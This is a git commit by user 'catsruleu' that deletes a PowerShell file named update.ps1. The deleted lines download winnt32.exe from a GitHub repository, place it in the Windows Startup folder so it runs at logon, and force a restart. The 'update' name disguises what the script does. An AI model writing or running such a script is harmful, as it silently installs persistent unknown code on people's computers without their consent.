57192308aee808524b4d15dab9b1f1052b1224f8
N <119331551+catsruleu@users.noreply.github.com>
2022-11-28 18:00:00 -0600

    Delete update.ps1

--- update.ps1
+++
@@ -1,3 +0,0 @@
-curl https://github.com/catsruleu/winrick/raw/main/winnt32.exe -O c:\Users\*\Downloads\winnt32.exe
-Move-Item –Path c:\Users\*\Downloads\winnt32.exe -Destination C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-Restart-Computer
